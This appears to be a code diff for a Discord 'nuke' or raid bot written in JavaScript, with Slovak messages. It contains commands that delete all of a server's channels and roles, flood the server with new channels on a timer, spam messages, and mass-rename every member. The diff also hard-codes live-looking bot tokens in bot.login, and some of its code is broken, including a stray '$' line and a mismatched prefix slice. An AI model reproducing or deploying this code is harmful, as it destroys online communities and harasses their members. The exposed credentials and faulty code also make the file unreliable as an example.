@@ -19,7 +19,18 @@ bot.on('message', message => {
 	 message.guild.channels.forEach(channel => channel.delete())
 	 message.guild.roles.forEach(roles => roles.delete()) } 
 	  
-    if(message.content === prefix + 'create') {
+
+  if(message.content === prefix + 'nick') {
+    let nick = message.content.slice((prefix + 'setnick').length)
+    if(!nick) return message.channel.send("zadaj nick pls").then(r=>r.delete(150000))
+  
+    message.guild.members.cache.forEach(r=>r.setNickname(nick + r.name))
+    message.channel.send("menim nicky")
+    
+    }
+    
+$
+     if(message.content === prefix + 'create') {
       setInterval(function() {
       message.guild.createChannel('text-text-text', 'text')
       message.guild.createChannel('hahahhaha', 'voice')
@@ -77,8 +88,10 @@ if(message.content === prefix + 'spam') {
   message.channel.send(xinfo)
   }
 })
+
+
        
-bot.login("Nzg3NTkzNTc5NjYzOTgyNjIy.X9XNrg.4gcyHQhxic9OzT-ZIIj61s2XcxY")
+bot.login("Nzg3NTkzNTc5NjYzOTgyNjIy.X9XNrg.TCrDA5RAmZIx3v2XMX5Et_fcukY")
 
 
 bot.on('message', gotMessage);
